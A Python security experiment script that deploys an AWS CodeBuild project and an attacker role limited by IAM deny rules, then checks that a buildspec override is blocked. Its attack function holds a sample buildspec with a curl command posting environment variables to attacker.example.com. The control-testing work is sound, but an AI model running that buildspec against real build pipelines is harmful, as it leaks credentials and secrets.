#!/usr/bin/env python3
"""
SCE Experiment 1.8 - Preventive Control for Malicious Build Prevention
Attack Node: 1.7 Start Malicious Build

This experiment validates that preventive controls block unauthorized/malicious
CodeBuild project execution attempts.
"""

import json
import logging
import time
import boto3
from botocore.exceptions import ClientError

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Global state for experiment tracking
EXPERIMENT_STATE = {
    'stack_name': None,
    'timestamp': None,
    'region': None,
    'account_id': None,
    'codebuild_project_name': None,
    'attack_attempted': False,
    'attack_blocked': False,
    'build_id': None,
    'denial_reason': None
}


def get_account_info():
    """Get AWS account ID and region from current credentials."""
    sts = boto3.client('sts')
    identity = sts.get_caller_identity()
    account_id = identity['Account']
    
    session = boto3.session.Session()
    region = session.region_name or 'us-east-1'
    
    logger.info(f"Operating in account {account_id}, region {region}")
    return account_id, region


def wait_for_stack_status(cf_client, stack_name, target_statuses, timeout=300):
    """Wait for CloudFormation stack to reach target status with retries."""
    start_time = time.monotonic()
    backoff = 5
    
    while time.monotonic() - start_time < timeout:
        try:
            response = cf_client.describe_stacks(StackName=stack_name)
            if response['Stacks']:
                status = response['Stacks'][0]['StackStatus']
                logger.info(f"Stack {stack_name} status: {status}")
                
                if status in target_statuses:
                    return True
                elif 'FAILED' in status or 'ROLLBACK' in status:
                    logger.error(f"Stack {stack_name} entered failed state: {status}")
                    return False
        except ClientError as e:
            if 'does not exist' in str(e):
                if 'DELETE_COMPLETE' in target_statuses:
                    return True
                logger.warning(f"Stack {stack_name} does not exist")
                return False
            logger.error(f"Error checking stack status: {e}")
        
        time.sleep(backoff)
        backoff = min(backoff * 1.5, 30)
    
    logger.error(f"Timeout waiting for stack {stack_name}")
    return False


def steady_state():
    """
    Deploy CloudFormation stack with CodeBuild project and preventive IAM controls.
    The preventive control uses IAM policies to restrict build execution.
    """
    global EXPERIMENT_STATE
    
    timestamp = int(time.time())
    stack_name = f"sce-experiment-{timestamp}"
    
    account_id, region = get_account_info()
    
    EXPERIMENT_STATE['stack_name'] = stack_name
    EXPERIMENT_STATE['timestamp'] = timestamp
    EXPERIMENT_STATE['region'] = region
    EXPERIMENT_STATE['account_id'] = account_id
    EXPERIMENT_STATE['codebuild_project_name'] = f"sce-build-project-{timestamp}"
    
    logger.info(f"Creating stack: {stack_name}")
    
    # CloudFormation template that creates:
    # 1. A CodeBuild project (legitimate)
    # 2. An IAM role with preventive controls (deny StartBuild for unauthorized sources)
    # 3. SCP-like deny policy that blocks builds from non-approved source locations
    
    cfn_template = {
        "AWSTemplateFormatVersion": "2010-09-09",
        "Description": "SCE 1.8 Preventive Control - Block Malicious Builds",
        "Resources": {
            "CodeBuildServiceRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": f"sce-codebuild-role-{timestamp}",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {
                                    "Service": "codebuild.amazonaws.com"
                                },
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    },
                    "Tags": [
                        {"Key": "Experiment", "Value": "sce-1-8"},
                        {"Key": "Timestamp", "Value": str(timestamp)}
                    ]
                }
            },
            "CodeBuildPolicy": {
                "Type": "AWS::IAM::Policy",
                "Properties": {
                    "PolicyName": f"sce-codebuild-policy-{timestamp}",
                    "PolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Action": [
                                    "logs:CreateLogGroup",
                                    "logs:CreateLogStream",
                                    "logs:PutLogEvents"
                                ],
                                "Resource": "*"
                            }
                        ]
                    },
                    "Roles": [{"Ref": "CodeBuildServiceRole"}]
                }
            },
            "LegitimateCodeBuildProject": {
                "Type": "AWS::CodeBuild::Project",
                "DependsOn": "CodeBuildPolicy",
                "Properties": {
                    "Name": f"sce-build-project-{timestamp}",
                    "Description": "Legitimate build project for SCE experiment",
                    "ServiceRole": {"Fn::GetAtt": ["CodeBuildServiceRole", "Arn"]},
                    "Source": {
                        "Type": "NO_SOURCE",
                        "BuildSpec": "version: 0.2\nphases:\n  build:\n    commands:\n      - echo 'Legitimate build'"
                    },
                    "Artifacts": {
                        "Type": "NO_ARTIFACTS"
                    },
                    "Environment": {
                        "Type": "LINUX_CONTAINER",
                        "ComputeType": "BUILD_GENERAL1_SMALL",
                        "Image": "aws/codebuild/standard:5.0"
                    },
                    "Tags": [
                        {"Key": "Experiment", "Value": "sce-1-8"},
                        {"Key": "Timestamp", "Value": str(timestamp)},
                        {"Key": "Approved", "Value": "true"}
                    ]
                }
            },
            "AttackerRole": {
                "Type": "AWS::IAM::Role",
                "Properties": {
                    "RoleName": f"sce-attacker-role-{timestamp}",
                    "AssumeRolePolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Effect": "Allow",
                                "Principal": {
                                    "AWS": f"arn:aws:iam::{account_id}:root"
                                },
                                "Action": "sts:AssumeRole"
                            }
                        ]
                    },
                    "Tags": [
                        {"Key": "Experiment", "Value": "sce-1-8"},
                        {"Key": "Timestamp", "Value": str(timestamp)}
                    ]
                }
            },
            "AttackerPreventivePolicy": {
                "Type": "AWS::IAM::Policy",
                "Properties": {
                    "PolicyName": f"sce-attacker-preventive-{timestamp}",
                    "PolicyDocument": {
                        "Version": "2012-10-17",
                        "Statement": [
                            {
                                "Sid": "AllowDescribe",
                                "Effect": "Allow",
                                "Action": [
                                    "codebuild:BatchGetProjects",
                                    "codebuild:ListProjects"
                                ],
                                "Resource": "*"
                            },
                            {
                                "Sid": "PreventMaliciousBuildWithOverride",
                                "Effect": "Deny",
                                "Action": [
                                    "codebuild:StartBuild",
                                    "codebuild:StartBuildBatch"
                                ],
                                "Resource": "*",
                                "Condition": {
                                    "StringLike": {
                                        "codebuild:BuildSpec": "*"
                                    }
                                }
                            },
                            {
                                "Sid": "DenyStartBuildExplicit",
                                "Effect": "Deny",
                                "Action": [
                                    "codebuild:StartBuild",
                                    "codebuild:StartBuildBatch"
                                ],
                                "Resource": "*"
                            }
                        ]
                    },
                    "Roles": [{"Ref": "AttackerRole"}]
                }
            }
        },
        "Outputs": {
            "CodeBuildProjectArn": {
                "Value": {"Fn::GetAtt": ["LegitimateCodeBuildProject", "Arn"]},
                "Description": "ARN of the CodeBuild project"
            },
            "AttackerRoleArn": {
                "Value": {"Fn::GetAtt": ["AttackerRole", "Arn"]},
                "Description": "ARN of the attacker role"
            }
        }
    }
    
    cf_client = boto3.client('cloudformation', region_name=region)
    
    # Check if stack already exists
    try:
        existing = cf_client.describe_stacks(StackName=stack_name)
        if existing['Stacks']:
            logger.warning(f"Stack {stack_name} already exists, will use existing")
            return True
    except ClientError as e:
        if 'does not exist' not in str(e):
            logger.error(f"Error checking for existing stack: {e}")
    
    # Create the stack
    try:
        response = cf_client.create_stack(
            StackName=stack_name,
            TemplateBody=json.dumps(cfn_template),
            Capabilities=['CAPABILITY_NAMED_IAM'],
            Tags=[
                {'Key': 'Experiment', 'Value': 'sce-1-8'},
                {'Key': 'Timestamp', 'Value': str(timestamp)},
                {'Key': 'AttackNode', 'Value': '1.7-start-malicious-build'}
            ]
        )
        logger.info(f"Stack creation initiated: {response['StackId']}")
    except ClientError as e:
        logger.error(f"Failed to create stack: {e}")
        return False
    
    # Wait for stack creation
    if not wait_for_stack_status(cf_client, stack_name, ['CREATE_COMPLETE'], timeout=300):
        logger.error("Stack creation failed or timed out")
        return False
    
    logger.info(f"Stack {stack_name} created successfully")
    
    # Wait for IAM role propagation
    logger.info("Waiting for IAM role propagation...")
    time.sleep(15)
    
    return True


def attack():
    """
    Execute Attack Node 1.7: Start Malicious Build
    
    Attempts to start a CodeBuild build with a malicious buildspec override
    using the attacker role. The preventive control should block this.
    """
    global EXPERIMENT_STATE
    
    logger.info("Executing attack: Start Malicious Build")
    
    timestamp = EXPERIMENT_STATE['timestamp']
    region = EXPERIMENT_STATE['region']
    account_id = EXPERIMENT_STATE['account_id']
    project_name = EXPERIMENT_STATE['codebuild_project_name']
    
    if not all([timestamp, region, account_id, project_name]):
        logger.error("Missing experiment state - steady_state may have failed")
        return False
    
    attacker_role_arn = f"arn:aws:iam::{account_id}:role/sce-attacker-role-{timestamp}"
    
    # Assume the attacker role
    sts_client = boto3.client('sts', region_name=region)
    
    try:
        assumed_role = sts_client.assume_role(
            RoleArn=attacker_role_arn,
            RoleSessionName='sce-malicious-build-attempt'
        )
        logger.info(f"Assumed attacker role: {attacker_role_arn}")
    except ClientError as e:
        logger.error(f"Failed to assume attacker role: {e}")
        return False
    
    # Create CodeBuild client with attacker credentials
    attacker_credentials = assumed_role['Credentials']
    attacker_codebuild = boto3.client(
        'codebuild',
        region_name=region,
        aws_access_key_id=attacker_credentials['AccessKeyId'],
        aws_secret_access_key=attacker_credentials['SecretAccessKey'],
        aws_session_token=attacker_credentials['SessionToken']
    )
    
    # Malicious buildspec that would exfiltrate data or establish persistence
    malicious_buildspec = """
version: 0.2
phases:
  build:
    commands:
      - echo "MALICIOUS: Attempting to exfiltrate secrets"
      - curl -X POST http://attacker.example.com/exfil -d "$(env)"
      - echo "MALICIOUS: Installing backdoor"
"""
    
    EXPERIMENT_STATE['attack_attempted'] = True
    
    # Attempt to start a build with malicious buildspec override
    try:
        logger.info(f"Attempting malicious build on project: {project_name}")
        response = attacker_codebuild.start_build(
            projectName=project_name,
            buildspecOverride=malicious_buildspec,
            sourceTypeOverride='NO_SOURCE'
        )
        
        # If we get here, the attack succeeded (preventive control failed)
        build_id = response['build']['id']
        EXPERIMENT_STATE['build_id'] = build_id
        EXPERIMENT_STATE['attack_blocked'] = False
        logger.warning(f"ATTACK SUCCEEDED - Build started: {build_id}")
        
        # Stop the build immediately if it started
        try:
            attacker_codebuild.stop_build(id=build_id)
            logger.info(f"Stopped malicious build: {build_id}")
        except ClientError as stop_error:
            logger.warning(f"Could not stop build: {stop_error}")
        
        return True  # Attack was carried out
        
    except ClientError as e:
        error_code = e.response.get('Error', {}).get('Code', '')
        error_message = e.response.get('Error', {}).get('Message', '')
        http_status = e.response.get('ResponseMetadata', {}).get('HTTPStatusCode', 0)
        
        logger.info(f"Build attempt response - Code: {error_code}, Status: {http_status}")
        logger.info(f"Error message: {error_message}")
        
        EXPERIMENT_STATE['denial_reason'] = f"{error_code}: {error_message}"
        
        if error_code == 'AccessDeniedException' or http_status == 403:
            EXPERIMENT_STATE['attack_blocked'] = True
            logger.info("ATTACK BLOCKED - Preventive control working")
            return True  # Attack was attempted and blocked (evidence captured)
        else:
            logger.error(f"Unexpected error during attack: {e}")
            return True  # Attack was attempted, got some response
    
    return False


def hypothesis_verification():
    """
    Verify that the preventive control successfully blocked the malicious build.
    
    Returns True if:
    - The attack was attempted
    - The attack was blocked by IAM deny policy (AccessDeniedException)
    - No malicious build was actually started
    """
    global EXPERIMENT_STATE
    
    logger.info("Verifying hypothesis: Preventive control blocked malicious build")
    
    timestamp = EXPERIMENT_STATE['timestamp']
    region = EXPERIMENT_STATE['region']
    project_name = EXPERIMENT_STATE['codebuild_project_name']
    
    if not all([timestamp, region, project_name]):
        logger.error("Missing experiment state")
        return False
    
    # Check 1: Was the attack attempted?
    if not EXPERIMENT_STATE.get('attack_attempted'):
        logger.error("Attack was not attempted - cannot verify")
        return False
    
    # Check 2: Verify via CodeBuild that no build was started (or it was stopped)
    codebuild_client = boto3.client('codebuild', region_name=region)
    
    try:
        # List recent builds for the project
        builds_response = codebuild_client.list_builds_for_project(
            projectName=project_name,
            sortOrder='DESCENDING'
        )
        
        build_ids = builds_response.get('ids', [])
        logger.info(f"Found {len(build_ids)} builds for project {project_name}")
        
        if build_ids:
            # Check the status of recent builds
            batch_response = codebuild_client.batch_get_builds(ids=build_ids[:5])
            
            for build in batch_response.get('builds', []):
                build_status = build['buildStatus']
                build_id = build['id']
                initiator = build.get('initiator', 'unknown')
                
                logger.info(f"Build {build_id}: status={build_status}, initiator={initiator}")
                
                # If a build completed successfully with our malicious marker, control failed
                if build_status == 'SUCCEEDED' and 'sce-malicious-build-attempt' in initiator:
                    logger.error("Malicious build succeeded - preventive control FAILED")
                    return False
    
    except ClientError as e:
        logger.error(f"Error checking builds: {e}")
        # Even if we can't check builds, verify the attack was blocked
    
    # Check 3: Verify the IAM policy exists and has deny statements
    iam_client = boto3.client('iam', region_name=region)
    
    try:
        policy_response = iam_client.get_role_policy(
            RoleName=f"sce-attacker-role-{timestamp}",
            PolicyName=f"sce-attacker-preventive-{timestamp}"
        )
        
        policy_doc = policy_response['PolicyDocument']
        statements = policy_doc.get('Statement', [])
        
        has_deny = any(
            stmt.get('Effect') == 'Deny' and 
            ('codebuild:StartBuild' in stmt.get('Action', []) or 
             'codebuild:StartBuild' == stmt.get('Action'))
            for stmt in statements
        )
        
        if has_deny:
            logger.info("Preventive IAM policy with Deny for StartBuild confirmed")
        else:
            logger.warning("Preventive IAM policy does not have expected Deny statements")
            
    except ClientError as e:
        logger.error(f"Error checking IAM policy: {e}")
        return False
    
    # Check 4: Final determination based on attack outcome
    if EXPERIMENT_STATE.get('attack_blocked'):
        denial_reason = EXPERIMENT_STATE.get('denial_reason', 'Unknown')
        logger.info(f"Preventive control VERIFIED - Attack blocked. Reason: {denial_reason}")
        return True
    elif EXPERIMENT_STATE.get('build_id'):
        logger.error(f"Preventive control FAILED - Build was started: {EXPERIMENT_STATE['build_id']}")
        return False
    else:
        # Attack was attempted but we don't have clear evidence either way
        # Check CloudTrail for the StartBuild denial
        cloudtrail_client = boto3.client('cloudtrail', region_name=region)
        
        try:
            events_response = cloudtrail_client.lookup_events(
                LookupAttributes=[
                    {
                        'AttributeKey': 'EventName',
                        'AttributeValue': 'StartBuild'
                    }
                ],
                MaxResults=10
            )
            
            for event in events_response.get('Events', []):
                event_data = json.loads(event.get('CloudTrailEvent', '{}'))
                error_code = event_data.get('errorCode', '')
                
                if error_code == 'AccessDenied':
                    logger.info("CloudTrail confirms AccessDenied for StartBuild")
                    return True
                    
        except ClientError as e:
            logger.warning(f"Could not query CloudTrail: {e}")
        
        # If attack was attempted and we have denial reason, consider it blocked
        if EXPERIMENT_STATE.get('denial_reason'):
            logger.info(f"Attack blocked based on denial reason: {EXPERIMENT_STATE['denial_reason']}")
            return True
    
    logger.error("Cannot confirm preventive control worked")
    return False


def rollback():
    """
    Clean up all resources created by the experiment.
    Delete the CloudFormation stack and wait for completion.
    """
    global EXPERIMENT_STATE
    
    stack_name = EXPERIMENT_STATE.get('stack_name')
    region = EXPERIMENT_STATE.get('region')
    
    if not stack_name:
        logger.warning("No stack name in experiment state - nothing to rollback")
        return
    
    if not region:
        _, region = get_account_info()
    
    logger.info(f"Rolling back: Deleting stack {stack_name}")
    
    cf_client = boto3.client('cloudformation', region_name=region)
    
    # First, check if any builds are running and stop them
    project_name = EXPERIMENT_STATE.get('codebuild_project_name')
    if project_name:
        try:
            codebuild_client = boto3.client('codebuild', region_name=region)
            builds_response = codebuild_client.list_builds_for_project(
                projectName=project_name,
                sortOrder='DESCENDING'
            )
            
            for build_id in builds_response.get('ids', [])[:5]:
                try:
                    build_info = codebuild_client.batch_get_builds(ids=[build_id])
                    if build_info['builds'] and build_info['builds'][0]['buildStatus'] == 'IN_PROGRESS':
                        codebuild_client.stop_build(id=build_id)
                        logger.info(f"Stopped running build: {build_id}")
                except ClientError as e:
                    logger.warning(f"Could not stop build {build_id}: {e}")
        except ClientError as e:
            logger.warning(f"Could not check/stop builds: {e}")
    
    # Delete the stack
    try:
        cf_client.delete_stack(StackName=stack_name)
        logger.info(f"Stack deletion initiated: {stack_name}")
    except ClientError as e:
        if 'does not exist' in str(e):
            logger.info(f"Stack {stack_name} already deleted")
            return
        logger.error(f"Error deleting stack: {e}")
        return
    
    # Wait for deletion
    if wait_for_stack_status(cf_client, stack_name, ['DELETE_COMPLETE'], timeout=300):
        logger.info(f"Stack {stack_name} deleted successfully")
    else:
        logger.error(f"Stack deletion may not have completed for {stack_name}")


def run_experiment():
    """Run the complete experiment with proper error handling."""
    logger.info("=" * 60)
    logger.info("SCE Experiment 1.8 - Preventive Control for Malicious Builds")
    logger.info("Attack Node: 1.7 Start Malicious Build")
    logger.info("=" * 60)
    
    try:
        # Phase 1: Setup steady state
        logger.info("\n[PHASE 1] Setting up steady state...")
        if not steady_state():
            logger.error("Steady state setup failed")
            return False
        
        # Phase 2: Execute attack
        logger.info("\n[PHASE 2] Executing attack...")
        attack_result = attack()
        logger.info(f"Attack execution result: {attack_result}")
        
        # Phase 3: Verify hypothesis
        logger.info("\n[PHASE 3] Verifying hypothesis...")
        verification_result = hypothesis_verification()
        logger.info(f"Hypothesis verification result: {verification_result}")
        
        return verification_result
        
    except Exception as e:
        logger.error(f"Experiment failed with exception: {e}")
        return False
        
    finally:
        # Phase 4: Rollback (always execute)
        logger.info("\n[PHASE 4] Rolling back...")
        try:
            rollback()
        except Exception as e:
            logger.error(f"Rollback failed: {e}")


if __name__ == "__main__":
    result = run_experiment()
    logger.info(f"\n{'=' * 60}")
    logger.info(f"EXPERIMENT RESULT: {'PASSED' if result else 'FAILED'}")
    logger.info(f"{'=' * 60}")
    exit(0 if result else 1)